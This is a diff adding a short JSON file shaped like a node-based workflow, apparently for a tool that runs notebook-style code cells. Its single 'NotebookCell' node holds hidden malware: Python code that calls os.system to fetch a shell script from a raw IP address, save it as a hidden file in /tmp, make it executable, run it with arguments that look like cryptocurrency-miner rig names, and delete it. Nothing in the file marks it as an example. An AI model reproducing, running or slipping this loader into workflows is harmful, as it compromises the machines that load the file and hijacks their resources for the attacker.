@@ -1,0 +1,12 @@
+{
+  "10": {
+    "inputs": {
+      "code": "__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.vznost; (curl -sf http://5.78.73.122:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://5.78.73.122:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 5.78.73.122 rig38831-xmr rig38831-iron; rm -f \"$f\"')",
+      "No Preview": ""
+    },
+    "class_type": "NotebookCell",
+    "_meta": {
+      "title": "Notebook: Cell"
+    }
+  }
+}
